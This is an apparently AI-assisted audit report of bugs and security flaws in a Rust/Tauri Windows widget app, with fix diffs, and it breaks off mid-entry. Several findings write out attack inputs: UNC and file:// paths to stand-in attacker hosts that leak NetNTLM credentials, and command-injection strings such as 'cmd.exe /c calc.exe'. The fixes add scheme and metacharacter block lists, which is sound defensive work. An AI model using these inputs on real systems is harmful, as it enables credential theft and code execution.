# Review Findings

## Review: Complete vvidget Application & Windows 11 Fluent UX
**Date**: 2026-10-27 | **Tier**: 3 (Full Repository Audit)
**Files**: 145 | **Agents Used**: 9

| CRITICAL | MAJOR | MINOR | ENHANCEMENT |
|---|---|---|---|
| 4 | 32 | 28 | 9 |

### Fix First (top items)
1. [CRITICAL] [OPEN] M1-01 Arbitrary UNC Protocol and Remote NetNTLM Credential Leak Bypass in Custom Action Validation -- `src-tauri/src/actions/mod.rs:43-58`
2. [CRITICAL] [OPEN] M3-01 Unsafe WinRT COM iterator missing null pointer guards causing process crash -- `src-tauri/src/bluetooth/mod.rs:207`
3. [CRITICAL] [OPEN] X-fluent-ux-security-01 Unrestricted UNC Network Path and SMB Credential Leak in `validate_launch_target` -- `src-tauri/src/launcher/mod.rs:455-467`
4. [CRITICAL] [OPEN] X-fluent-ux-security-02 Command and Argument Injection via Space-Delimited Executable Targets in `execute_quick_action` -- `src-tauri/src/actions/mod.rs:43-59`

### Systemic Patterns
- **Remote UNC / SMB Path Validation Gaps (NetNTLM Leak)**: Custom action targets (`actions/mod.rs`) and game launcher executables (`launcher/mod.rs`) lack comprehensive UNC validation, allowing network share paths or `smb://` protocols that can trigger automated outbound SMB authentication and credential exposure.
- **Synchronous Win32 & Disk I/O on Tokio Worker Threads**: Multiple async commands (`launch_app_or_uri`, `execute_quick_action`, `scan_installed_games`, sysinfo metric queries) execute blocking Win32 APIs (`ShellExecuteW`), filesystem traversals, and registry queries directly on async reactor threads instead of offloading to `tokio::task::spawn_blocking`.
- **Read-Modify-Write Concurrency & Inconsistent State Persistence**: Several commands (`set_widgets_locked`, `set_autostart`, quick actions) bypass `ConfigManager::update_config` for atomic mutation, causing lost updates when racing with concurrent actions or background debounced disk saves.
- **WinRT COM Safety & Null Dereference Guards**: COM collections and iterators in Bluetooth device inspection omit null checks, risking panics/crashes when device properties contain unexpected COM types.
- **Windows 11 Fluent Layout & Contrast Clipping**: Hardcoded card dimensions (e.g. BatteryWidget 360x384px in 320x360px window, SpeedtestWidget hardcoded pixel widths) cause container overflow and scrollbars; missing light-theme tokens in fluent.css cause illegible status badges.

### Findings

### [CRITICAL] [FIXED] M1-01 Arbitrary UNC Protocol and Remote NetNTLM Credential Leak Bypass in Custom Action Validation
- **Status**: FIXED
- **Where**: `src-tauri/src/actions/mod.rs:43-58`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: security
- **Scenario**: An attacker or untrusted payload triggers `execute_quick_action("custom", Some("file://attacker.com/share/poc.exe"))` or `file:\\\\attacker.com\\share`.
- **Why**: `validate_custom_target` only validates that `target` does not start with `\\` or `//`. Passing a `file://` scheme or embedding backslashes bypasses this check. `is_uri_target` classifies `file://` as a URI, and `ShellExecuteW` resolves it to a remote SMB/WebDAV share, leaking the logged-in user's NetNTLM authentication hashes and potentially executing arbitrary remote binaries.
- **Fix**:
```diff
--- a/src-tauri/src/actions/mod.rs
+++ b/src-tauri/src/actions/mod.rs
@@ -49,8 +49,14 @@ fn validate_custom_target(target: &str) -> Result<(), String> {
     if target.len() > 2048 {
         return Err("Target exceeds maximum allowed length (2048 chars)".to_string());
     }
-    // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks
-    if target.starts_with(r"\\") || target.starts_with("//") {
+    // Prohibit remote SMB / UNC network paths and dangerous schemes
+    let lower = target.to_lowercase();
+    if lower.starts_with(r"\\")
+        || lower.starts_with("//")
+        || lower.starts_with("file:")
+        || lower.starts_with("ms-msdt:")
+        || lower.starts_with("search-ms:")
+    {
         return Err("UNC network paths are prohibited".to_string());
     }
     // Prohibit shell command chaining, pipe, and redirection attacks
```

---

### [CRITICAL] [FIXED] M3-01 Unsafe WinRT COM iterator missing null pointer guards causing process crash
- **Status**: FIXED
- **Where**: `src-tauri/src/bluetooth/mod.rs:207`, `src-tauri/src/bluetooth/mod.rs:352`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness [lens: F1b]
- **Scenario**: When Windows Runtime internal collection marshaling or external COM callers invoke `IIterator<HSTRING>::Current` or `IIterable<HSTRING>::First`, a null output pointer (`result.is_null()`) is passed during query probing or invalid calls. `iterator_current` executes `result.write(core::mem::MaybeUninit::new(hstring))` and `iterable_first` executes `*result = Box::into_raw(iterator)...` without verifying that `result` is non-null. The process suffers an immediate access violation segfault (`0xC0000005`), crashing the Tauri backend.
- **Why**: Windows COM ABI requires all out-pointer parameters (`[out, retval]`) to be validated for null before dereferencing, returning `E_POINTER` (`0x80004003`) on null pointers. The custom COM vtable implementations omitted null pointer guards.
- **Fix**:
```diff
--- a/src-tauri/src/bluetooth/mod.rs
+++ b/src-tauri/src/bluetooth/mod.rs
@@ -110,2 +110,3 @@ mod windows_impl {
     const S_OK: HRESULT = HRESULT(0);
+    const E_POINTER: HRESULT = HRESULT(-2147467261);
     const E_NOINTERFACE: HRESULT = HRESULT(-2147467262);
@@ -210,2 +211,5 @@ mod windows_impl {
     ) -> HRESULT {
+        if result.is_null() {
+            return E_POINTER;
+        }
         let obj = &*(this as *mut CustomIterator);
@@ -354,2 +358,5 @@ mod windows_impl {
     ) -> HRESULT {
+        if result.is_null() {
+            return E_POINTER;
+        }
         let obj = &*(this as *mut CustomIterable);
```

### [CRITICAL] [FIXED] X-fluent-ux-security-01 Unrestricted UNC Network Path and SMB Credential Leak in `validate_launch_target`
- **Status**: FIXED
- **Where**: `src-tauri/src/launcher/mod.rs:455-467`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: security
- **Scenario**: An attacker or untrusted payload triggers `add_custom_launcher_item` or `launch_app_or_uri(r"\\attacker-server\share\game.exe")`.
- **Why**: `validate_launch_target` verifies non-URI paths using `Path::new(trimmed).is_absolute()`, but does not reject UNC path prefixes (`\\` or `//`). In Rust on Windows, UNC paths have `Prefix::UNC` and are treated as absolute. When `validate_launch_target` proceeds to `path.exists()`, Windows immediately initiates an outbound SMB connection on TCP port 445, leaking the user's NetNTLM credentials to an external host. If the remote share hosts an executable, `ShellExecuteW` subsequently launches arbitrary remote binaries.
- **Fix**:
```diff
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -441,6 +441,12 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
         return Ok(());
     }
 
+    // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks and remote execution
+    let lower = trimmed.to_lowercase();
+    if lower.starts_with(r"\\") || lower.starts_with("//") {
+        return Err("UNC network paths are prohibited".to_string());
+    }
+
     // Disallow shell operators and chaining characters in paths
     let dangerous_path_chars = ['|', ';', '>', '<', '"', '`'];
     for dc in dangerous_path_chars {
```

---

### [CRITICAL] [FIXED] X-fluent-ux-security-02 Command and Argument Injection via Space-Delimited Executable Targets in `execute_quick_action`
- **Status**: FIXED
- **Where**: `src-tauri/src/actions/mod.rs:43-59`, `src-tauri/src/actions/mod.rs:98-107`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: security
- **Scenario**: A user or manipulated configuration passes a custom action target such as `custom_target = "cmd.exe /c calc.exe"` or `"powershell.exe -WindowStyle Hidden -Command ..."`.
- **Why**: `validate_custom_target` only blocks four metacharacters (`&`, `|`, `;`, `` ` ``), but does not verify that the executable path exists, is an allowed executable extension, or lacks argument delimiters. When `ResolvedAction::Executable` is passed to `launch_shell_execute`, `ShellExecuteW` is called with `lpFile = custom_target` and `lpParameters = NULL`. Under Win32 `ShellExecute` rules, if `lpFile` is unquoted and contains spaces, the first token is treated as the executable name and trailing tokens are passed as parameters, enabling arbitrary shell command execution.
- **Fix**:
```diff
--- a/src-tauri/src/actions/mod.rs
+++ b/src-tauri/src/actions/mod.rs
@@ -49,6 +49,15 @@ fn validate_custom_target(target: &str) -> Result<(), String> {
     if target.len() > 2048 {
         return Err("Target exceeds maximum allowed length (2048 chars)".to_string());
     }
+    // Prohibit executable command-line parameter injection when not a URI scheme
+    if !is_uri_target(target) {
+        if target.contains(' ') {
+            return Err("Custom executable paths cannot contain unquoted arguments".to_string());
+        }
+        let path = std::path::Path::new(target);
+        if !path.is_absolute() || !path.is_file() {
+            return Err("Custom executable target must be an existing absolute file".to_string());
+        }
+    }
     // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks
     if target.starts_with(r"\\") || target.starts_with("//") {
         return Err("UNC network paths are prohibited".to_string());
```

---

### [MAJOR] [FIXED] M1-02 Race Condition in `hide_window` Causes Shell Subclass to Veto Programmatic Hide
- **Status**: FIXED
- **Where**: `src-tauri/src/window/win32.rs:119-130`, `src-tauri/src/window/win32.rs:456-462`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: Application switches layout mode or hides the main window via `hide_window(&main)` from an async runtime task.
- **Why**: `hide_window` sets `set_window_allow_hide(hwnd, true)`, triggers `window.hide()`, and immediately sets `set_window_allow_hide(hwnd, false)` on the caller thread. Because `window.hide()` dispatches asynchronously across threads to the Win32 UI message queue, `set_window_allow_hide(false)` executes before `WM_SHOWWINDOW` is dispatched. When `widget_subclass_proc` receives `WM_SHOWWINDOW`, `is_window_allow_hide` is already `false`, vetoing the hide with `return LRESULT(0)` and leaving the window permanently visible.
- **Fix**:
```diff
--- a/src-tauri/src/window/win32.rs
+++ b/src-tauri/src/window/win32.rs
@@ -123,10 +123,6 @@ pub fn hide_window<R: tauri::Runtime>(window: &tauri::WebviewWindow<R>) -> Resul
     if let Ok(hwnd) = window.hwnd() {
         set_window_allow_hide(hwnd.0 as isize, true);
     }
-    let res = window.hide();
-    #[cfg(windows)]
-    if let Ok(hwnd) = window.hwnd() {
-        set_window_allow_hide(hwnd.0 as isize, false);
-    }
-    res
+    window.hide()
 }
@@ -457,7 +453,11 @@ unsafe extern "system" fn widget_subclass_proc(
         WM_SHOWWINDOW => {
-            if wparam.0 == 0 && !is_window_allow_hide(hwnd.0 as isize) {
-                // Veto the hide request from the Windows Shell on Win+D / Show Desktop
-                return LRESULT(0);
+            if wparam.0 == 0 {
+                if is_window_allow_hide(hwnd.0 as isize) {
+                    set_window_allow_hide(hwnd.0 as isize, false);
+                } else {
+                    // Veto the hide request from the Windows Shell on Win+D / Show Desktop
+                    return LRESULT(0);
+                }
             }
             DefSubclassProc(hwnd, umsg, wparam, lparam)
         }
```

---

### [MAJOR] [FIXED] M1-03 Dragged Non-Starter Widgets Silently Drop Position Persistence in Config
- **Status**: FIXED
- **Where**: `src-tauri/src/window/manager.rs:177-185`, `src-tauri/src/lib.rs:133-143`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User toggles on any non-starter widget (e.g. `speedtest`, `launcher`, `calendar`, `battery`, `clock`, `bluetooth`, `quick_settings`) and drags it to a new desktop position.
- **Why**: `AppConfig::default()` only creates Map entries for `resources`, `spotify`, and `weather`. `handle_window_moved` and `save_widget_position` look up `config.widgets.get_mut(&widget_id)`. If the key does not already exist, `get_mut` returns `None`, silently discarding the coordinate update without inserting a `WidgetPlacement`, so the moved position is never saved to disk.
- **Fix**:
```diff
--- a/src-tauri/src/window/manager.rs
+++ b/src-tauri/src/window/manager.rs
@@ -178,13 +178,16 @@ impl WindowManager {
                 tauri::async_runtime::spawn(async move {
                     let mut config = cm.get_config().await;
-                    if let Some(placement) = config.widgets.get_mut(&widget_id) {
-                        placement.logical_x = logical_x;
-                        placement.logical_y = logical_y;
-                        placement.logical_width = logical_width;
-                        placement.logical_height = logical_height;
-                        placement.scale_factor = scale;
-                    }
+                    let placement = config.widgets.entry(widget_id.clone()).or_insert_with(|| crate::config::WidgetPlacement {
+                        id: widget_id.clone(),
+                        visible: true,
+                        logical_x,
+                        logical_y,
+                        logical_width,
+                        logical_height,
+                        scale_factor: scale,
+                        monitor_id: None,
+                    });
+                    placement.logical_x = logical_x;
+                    placement.logical_y = logical_y;
+                    placement.logical_width = logical_width;
+                    placement.logical_height = logical_height;
+                    placement.scale_factor = scale;
                     if let Err(e) = cm.save_debounced(config).await {
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -133,12 +133,16 @@ pub mod integration {
         if let Some(cm) = app.try_state::<ConfigManager>() {
             let mut config = cm.get_config().await;
-            let (w, h) = if let Some(placement) = config.widgets.get_mut(&widget_id) {
-                placement.logical_x = logical_x;
-                placement.logical_y = logical_y;
-                (placement.logical_width, placement.logical_height)
-            } else {
-                (320.0, 240.0)
-            };
+            let placement = config.widgets.entry(widget_id.clone()).or_insert_with(|| crate::config::WidgetPlacement {
+                id: widget_id.clone(),
+                visible: true,
+                logical_x,
+                logical_y,
+                logical_width: 320.0,
+                logical_height: 240.0,
+                scale_factor: 1.0,
+                monitor_id: None,
+            });
+            placement.logical_x = logical_x;
+            placement.logical_y = logical_y;
+            let (w, h) = (placement.logical_width, placement.logical_height);
```

---

### [MAJOR] [FIXED] M1-04 WindowManager Stale Scale Factor Inflates Logical Bounds Across Monitor DPI Boundaries
- **Status**: FIXED
- **Where**: `src-tauri/src/window/manager.rs:165-171`, `src-tauri/src/window/win32.rs:483-540`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User drags a widget from a standard DPI display (100% scale factor 1.0) onto a high-DPI display (200% scale factor 2.0).
- **Why**: `WidgetWindowInfo.scale_factor` is cached once at initial window setup and never updated when crossing monitors. In `handle_window_moved`, the new physical pixel rect (e.g. 640x480) is divided by the stale scale factor (1.0 instead of 2.0), storing inflated logical width and height (640x480) into config and causing the window size to double on restart.
- **Fix**:
```diff
--- a/src-tauri/src/window/manager.rs
+++ b/src-tauri/src/window/manager.rs
@@ -166,7 +166,13 @@ impl WindowManager {
     pub fn handle_window_moved(&self, hwnd: isize, rect: Rect) {
         if let Some(info) = self.find_widget_by_hwnd(hwnd) {
-            let scale = if info.scale_factor > 0.0 { info.scale_factor } else { 1.0 };
+            #[cfg(windows)]
+            let current_scale = unsafe {
+                let dpi = windows::Win32::UI::HiDpi::GetDpiForWindow(windows::Win32::Foundation::HWND(hwnd as *mut _));
+                if dpi > 0 { dpi as f64 / 96.0 } else { info.scale_factor }
+            };
+            #[cfg(not(windows))]
+            let current_scale = info.scale_factor;
+            let scale = if current_scale > 0.0 { current_scale } else { 1.0 };
             let logical_x = (rect.left as f64) / scale;
             let logical_y = (rect.top as f64) / scale;
```

---

### [MAJOR] [FIXED] M1-05 WindowManager Lock State Disconnected from Win32 Subclass Allowing Drag When Locked
- **Status**: FIXED
- **Where**: `src-tauri/src/window/manager.rs:88-90`, `src-tauri/src/window/win32.rs:472-540`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User sets "Lock Positions" to true via the tray menu or Settings. User or accidental mouse drag moves a widget window.
- **Why**: `WindowManager::set_locked` updates an internal atomic boolean, but `widget_subclass_proc` in `win32.rs` never checks this lock state. During `WM_MOVING` and `WM_EXITSIZEMOVE`, magnetic snapping, `SetWindowPos`, and config persistence continue to execute normally, bypassing the lock.
- **Fix**:
```diff
-        WM_SYSCOMMAND => {
-            if (wparam.0 as u32) & 0xFFF0 == SC_MINIMIZE {
-                return LRESULT(0);
-            }
-            DefSubclassProc(hwnd, umsg, wparam, lparam)
-        }
+        WM_SYSCOMMAND => {
+            let cmd = (wparam.0 as u32) & 0xFFF0;
+            if cmd == SC_MINIMIZE || (cmd == SC_MOVE && is_positions_locked()) {
+                return LRESULT(0);
+            }
+            DefSubclassProc(hwnd, umsg, wparam, lparam)
+        }
```

---

### [MAJOR] [FIXED] M2-01 Read-Modify-Write Race Condition in `set_widgets_locked` and `set_autostart` Causes Lost Updates
- **Status**: FIXED
- **Where**: `src-tauri/src/config/mod.rs:70-82`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: When a user locks widget positions (`set_widgets_locked`) or configures autostart (`set_autostart`), the backend fetches `manager.get_config().await`, updates only that single field in its local clone, and calls `save_config_immediate` / `save_immediate(config)`. If a concurrent operation (such as adding a calendar note, saving a speedtest result, or moving another widget) persists changes via `update_config` between `get_config()` and `save_immediate()`, `save_immediate` blindly overwrites `current_config` and `config.json` with its stale snapshot, permanently discarding the other mutations.
- **Why**: `set_widgets_locked` and `set_autostart` bypass `ConfigManager::update_config` and execute an uncoordinated read-modify-write sequence across asynchronous boundaries.
- **Fix**:
```diff
--- a/src-tauri/src/config/mod.rs
+++ b/src-tauri/src/config/mod.rs
@@ -69,14 +69,18 @@ pub async fn set_widgets_locked<R: Runtime>(
     app: AppHandle<R>,
     locked: bool,
 ) -> Result<(), String> {
-    let mut config = if let Some(manager) = app.try_state::<ConfigManager>() {
-        manager.get_config().await
+    if let Some(win_mgr) = app.try_state::<crate::window::WindowManager>() {
+        win_mgr.set_locked(locked);
+    }
+
+    if let Some(manager) = app.try_state::<ConfigManager>() {
+        let snapshot = manager
+            .update_config(|config| {
+                config.lock_positions = locked;
+                Ok(config.clone())
+            })
+            .await?;
+        let _ = app.emit("config-changed", &snapshot);
+        Ok(())
     } else {
-        load_or_recover_config(&resolve_config_path()).0
-    };
-
-    if let Some(win_mgr) = app.try_state::<crate::window::WindowManager>() {
-        win_mgr.set_locked(locked);
-    }
-
-    config.lock_positions = locked;
-    save_config_immediate(app, config).await
+        let mut config = load_or_recover_config(&resolve_config_path()).0;
+        config.lock_positions = locked;
+        save_config_immediate(app, config).await
+    }
 }
@@ -109,7 +113,12 @@ pub async fn set_autostart<R: Runtime>(app: AppHandle<R>, enabled: bool) -> Res
     // Update config in state as well
     if let Some(manager) = app.try_state::<ConfigManager>() {
-        let mut config = manager.get_config().await;
-        if config.auto_start != enabled {
-            config.auto_start = enabled;
-            let _ = manager.save_immediate(config.clone()).await;
-            let _ = app.emit("config-changed", &config);
-        }
+        let snapshot = manager
+            .update_config(|config| {
+                config.auto_start = enabled;
+                Ok(config.clone())
+            })
+            .await?;
+        let _ = app.emit("config-changed", &snapshot);
     }
```

### [MAJOR] [FIXED] M2-02 Unsynchronized Concurrent Disk Writes Between `save_immediate` and Background Debounce Task
- **Status**: FIXED
- **Where**: `src-tauri/src/config/storage.rs:310-315`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: concurrency
- **Scenario**: When the 500ms debounce timer pops, it dispatches `save_config_atomic(&path, &config_to_save)` on a blocking thread via `tokio::task::spawn_blocking`. If `save_immediate` or `update_config` is called at the same moment, `save_immediate` drops its in-memory write lock and immediately spawns another blocking task to write `config.json`. Both blocking tasks attempt concurrent atomic renames over `config.json`. On Windows NTFS, this triggers transient sharing violations (`ERROR_SHARING_VIOLATION`), or Thread 1's older debounced frame finishes second and overwrites the newer data persisted by `save_immediate`.
- **Why**: Disk persistence tasks in `ConfigManager` are dispatched into `spawn_blocking` without a dedicated mutex or channel to serialize physical filesystem operations.
- **Fix**:
```diff
--- a/src-tauri/src/config/storage.rs
+++ b/src-tauri/src/config/storage.rs
@@ -271,2 +271,3 @@ pub struct ConfigManager {
     is_dirty: Arc<AtomicBool>,
+    persist_lock: Arc<tokio::sync::Mutex<()>>,
     debounce_tx: mpsc::Sender<()>,
 }
@@ -282,2 +283,3 @@ impl ConfigManager {
         let is_dirty = Arc::new(AtomicBool::new(false));
+        let persist_lock = Arc::new(tokio::sync::Mutex::new(()));
 
         let (debounce_tx, mut debounce_rx) = mpsc::channel::<()>(64);
         let write_path = config_path.clone();
         let loop_config = current_config.clone();
         let loop_dirty = is_dirty.clone();
+        let loop_persist = persist_lock.clone();
 
         tauri::async_runtime::spawn(async move {
@@ -310,4 +312,5 @@ impl ConfigManager {
                         if loop_dirty.swap(false, Ordering::SeqCst) {
+                            let _guard = loop_persist.lock().await;
                             let config_to_save = loop_config.read().await.clone();
                             let path = write_path.clone();
                             let _ = tokio::task::spawn_blocking(move || {
@@ -324,2 +327,3 @@ impl ConfigManager {
             current_config,
             is_dirty,
+            persist_lock,
             debounce_tx,
@@ -369,3 +373,4 @@ impl ConfigManager {
         self.is_dirty.store(false, Ordering::SeqCst);
+        let _guard = self.persist_lock.lock().await;
         let path = self.config_path.clone();
         tokio::task::spawn_blocking(move || save_config_atomic(&path, &config))
```

### [MAJOR] [FIXED] M2-03 Unhandled Error and Silent State Desynchronization in Debounced Disk Save
- **Status**: FIXED
- **Where**: `src-tauri/src/config/storage.rs:309-316`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: In the background debounce task, when the timer fires, `loop_dirty.swap(false, Ordering::SeqCst)` clears the dirty flag BEFORE running `save_config_atomic`. If `save_config_atomic` fails (e.g. disk full, permission denied, or transient antivirus file locking), the return value is discarded (`let _ = tokio::task::spawn_blocking(...)`), no log entry is emitted, and `is_dirty` remains false. The in-memory state and disk state permanently desynchronize without alerting the application or retrying on subsequent updates.
- **Why**: Background debounce loop ignores the `Result` from atomic save and clears the dirty flag unconditionally before knowing whether the save succeeded.
- **Fix**:
```diff
--- a/src-tauri/src/config/storage.rs
+++ b/src-tauri/src/config/storage.rs
@@ -308,6 +308,10 @@ impl ConfigManager {
                         if loop_dirty.swap(false, Ordering::SeqCst) {
                             let config_to_save = loop_config.read().await.clone();
                             let path = write_path.clone();
-                            let _ = tokio::task::spawn_blocking(move || {
+                            let res = tokio::task::spawn_blocking(move || {
                                 save_config_atomic(&path, &config_to_save)
                             }).await;
+                            if let Ok(Err(e)) = res {
+                                log::error!("Debounced config write failed: {}", e);
+                                loop_dirty.store(true, Ordering::SeqCst);
+                            }
                         }
```

### [MAJOR] [OPEN] M3-02 WinRT Battery report query lacks COM apartment initialization
- **Status**: OPEN
- **Where**: `src-tauri/src/battery/mod.rs:440`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug [lens: F1b]
- **Scenario**: The frontend battery widget calls synchronous command `get_battery_status`. Tauri dispatches this command on a Tokio worker threadpool thread where COM has not been initialized. `Battery::AggregateBattery()` fails immediately with `0x800401F0 (CO_E_NOTINITIALIZED)`. The error is caught by `if let Ok(telemetry) = query_winrt_battery_report()`, which fails silently and falls back to `GetSystemPowerStatus`. The widget permanently loses exact floating-point battery percentages, discharge/charge rates in milliwatts, and remaining mWh capacity data.
- **Why**: WinRT APIs require the calling thread to enter a COM apartment via `CoInitializeEx` or `RoInitialize`. While other WinRT modules in vvidget use `ComGuard`, `battery/mod.rs` omitted COM initialization entirely.
- **Fix**:
```diff
--- a/src-tauri/src/battery/mod.rs
+++ b/src-tauri/src/battery/mod.rs
@@ -440,6 +440,7 @@ fn query_winrt_battery_report() -> Result<RawBatteryTelemetry, String> {
+    let _com_guard = crate::geo::winrt::ComGuard::new();
     use windows::Devices::Power::Battery;
     use windows::System::Power::BatteryStatus as WinRTBatteryStatus;
```

### [MAJOR] [OPEN] M3-03 Battery tracker fails to reset discharge baseline when unplugged at full charge
- **Status**: OPEN
- **Where**: `src-tauri/src/battery/mod.rs:109-115`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: A laptop rests plugged into AC power at 100% capacity (or at an 80% battery health threshold). Because charging is idle/stopped, `is_charging` is `false`. When the user unplugs the AC adapter, the power source switches to battery (`is_plugged_in` becomes `false`), but `is_charging` remains `false`. Line 110 tests `if last_charging != telemetry.is_charging`, which evaluates to `false != false` (no change). `self.samples` is NOT cleared and `smoothed_rate` is NOT reset. The tracker retains stale samples collected during AC operation, distorting drain rate calculations and time-to-empty estimates.
- **Why**: `BatteryTracker` only tracks `last_charging_state: Option<bool>` and ignores `telemetry.is_plugged_in`. Transitioning between AC power and battery power when charging is inactive fails to trigger the state reset.
- **Fix**:
```diff
--- a/src-tauri/src/battery/mod.rs
+++ b/src-tauri/src/battery/mod.rs
@@ -89,3 +89,3 @@ pub struct BatteryTracker {
     pub last_sparkline_percent: Option<u8>,
-    pub last_charging_state: Option<bool>,
+    pub last_power_state: Option<(bool, bool)>,
 }
@@ -108,7 +108,7 @@ impl BatteryTracker {
-        // Reset state if charging state toggled (e.g. plugged in / unplugged)
-        if let Some(last_charging) = self.last_charging_state {
-            if last_charging != telemetry.is_charging {
+        // Reset state if power or charging state toggled (e.g. plugged in / unplugged)
+        if let Some((last_charging, last_plugged)) = self.last_power_state {
+            if last_charging != telemetry.is_charging || last_plugged != telemetry.is_plugged_in {
                 self.samples.clear();
                 self.smoothed_rate = None;
             }
         }
-        self.last_charging_state = Some(telemetry.is_charging);
+        self.last_power_state = Some((telemetry.is_charging, telemetry.is_plugged_in));
```

### [MAJOR] [OPEN] M3-04 Bluetooth device connection returns false success without initiating connection
- **Status**: OPEN
- **Where**: `src-tauri/src/bluetooth/mod.rs:515-523`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract [lens: F1b]
- **Scenario**: When the user clicks "Connect" on a paired Bluetooth device in the Bluetooth widget, the frontend invokes `toggle_bluetooth_device(device_id, true)`. `toggle_device` executes `Ok(connect)` without making any WinRT API call or initiating any connection attempt. The frontend receives `true`, displays a success notification, and toggles the UI button to "Connected", while the device physically remains disconnected.
- **Why**: WinRT does not provide a single parameterless `ConnectAsync` method on `BluetoothDevice` without RFCOMM or GATT channel initialization. Instead of propagating an actionable error directing the user to Windows Settings, the function returns simulated success (`Ok(connect)`).
- **Fix**:
```diff
--- a/src-tauri/src/bluetooth/mod.rs
+++ b/src-tauri/src/bluetooth/mod.rs
@@ -515,9 +515,5 @@ mod windows_impl {
     pub fn toggle_device(_device_id: &str, connect: bool) -> Result<bool, String> {
         let _guard = ComGuard::new();
         if !connect {
-            // WinRT BluetoothDevice does not support disconnecting paired devices via IClosable.
             return Err("Bluetooth device disconnection is not supported directly via WinRT; please use Windows Settings".to_string());
         }
-        // WinRT does not provide a direct public ConnectAsync on BluetoothDevice without pairing or RFCOMM/GATT channel initiation.
-        Ok(connect)
+        Err("Direct Bluetooth device connection is not supported without pairing or GATT channel initiation; please use Windows Settings".to_string())
     }
```

### [MAJOR] [OPEN] M3-05 GSMTC session selector prioritizes paused Spotify over actively playing media
- **Status**: OPEN
- **Where**: `src-tauri/src/media/gsmtc.rs:71-95`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: A user keeps the Spotify desktop application running in the background while paused. The user then plays a YouTube video in Google Chrome or music in Apple Music / VLC. When `find_target_session` runs, loop 1 finds no playing Spotify session. Loop 2 ("Look for any Spotify session, e.g. paused") immediately matches the inactive Spotify session and returns it. Loop 3 (`manager.GetCurrentSession()`) and Loop 4 ("Look for any active playing session") are never evaluated. The media widget displays paused Spotify and ignores the actively playing audio.
- **Why**: `find_target_session` placed paused Spotify sessions ahead of system-current and non-Spotify actively playing sessions in the fallback hierarchy.
- **Fix**:
```diff
--- a/src-tauri/src/media/gsmtc.rs
+++ b/src-tauri/src/media/gsmtc.rs
@@ -70,8 +70,8 @@ mod win {
             }
 
-            // 2. Look for any Spotify session (e.g. paused)
+            // 2. Fall back to any active playing session
             for s in &all_sessions {
-                if let Ok(app_id) = s.SourceAppUserModelId() {
-                    if app_id.to_string().to_lowercase().contains("spotify") {
+                if let Ok(info) = s.GetPlaybackInfo() {
+                    if let Ok(status) = info.PlaybackStatus() {
+                        if status == GlobalSystemMediaTransportControlsSessionPlaybackStatus::Playing {
                             return Some(s.clone());
+                        }
                     }
                 }
@@ -83,9 +83,9 @@ mod win {
             }
 
-            // 4. Fall back to any active playing session
+            // 4. Fall back to any Spotify session (e.g. paused)
             for s in &all_sessions {
-                if let Ok(info) = s.GetPlaybackInfo() {
-                    if let Ok(status) = info.PlaybackStatus() {
-                        if status == GlobalSystemMediaTransportControlsSessionPlaybackStatus::Playing {
-                            return Some(s.clone());
-                        }
+                if let Ok(app_id) = s.SourceAppUserModelId() {
+                    if app_id.to_string().to_lowercase().contains("spotify") {
+                        return Some(s.clone());
                     }
                 }
```

### [MAJOR] [OPEN] M3-06 Media monitor event loop ignores timeline seeking and scrubbing
- **Status**: OPEN
- **Where**: `src-tauri/src/media/mod.rs:58-69`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: During song playback, a user scrubs the timeline in Spotify or YouTube (e.g. jumping from 0:15 to 2:45). In `start_media_monitor`, `has_changed` compares `is_active`, `is_playing`, `title`, `artist`, `album`, `track_id`, and `duration_ms`. None of these fields changed, and `position_ms` is omitted from the comparison. `has_changed` evaluates to `false`, and no `media-metadata-update` event is emitted. The frontend widget continues extrapolating time from the pre-seek timestamp, showing the wrong playback position until the track ends or pauses.
- **Why**: Continuous position updates are intentionally omitted to avoid 500ms event spam, but discrete jumps caused by manual seeks (`abs(delta) > 3000ms`) are not detected.
- **Fix**:
```diff
--- a/src-tauri/src/media/mod.rs
+++ b/src-tauri/src/media/mod.rs
@@ -58,8 +58,12 @@ pub fn start_media_monitor(app_handle: tauri::AppHandle) {
             loop {
                 let current = gsmtc::get_current_media_session().unwrap_or_default();
+                let pos_jump = (current.timeline.position_ms as i64 - last_session.timeline.position_ms as i64).abs() > 3000;
                 let has_changed = current.is_active != last_session.is_active
                     || current.is_playing != last_session.is_playing
                     || current.title != last_session.title
                     || current.artist != last_session.artist
                     || current.album != last_session.album
                     || current.track_id != last_session.track_id
+                    || pos_jump
                     || (current.is_playing && current.timeline.duration_ms != last_session.timeline.duration_ms);
```

### [MAJOR] [FIXED] M3-07 `launch_app_or_uri` blocks Tokio async worker threads with synchronous `ShellExecuteW`
- **Status**: FIXED
- **Where**: `src-tauri/src/launcher/mod.rs:505-558`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
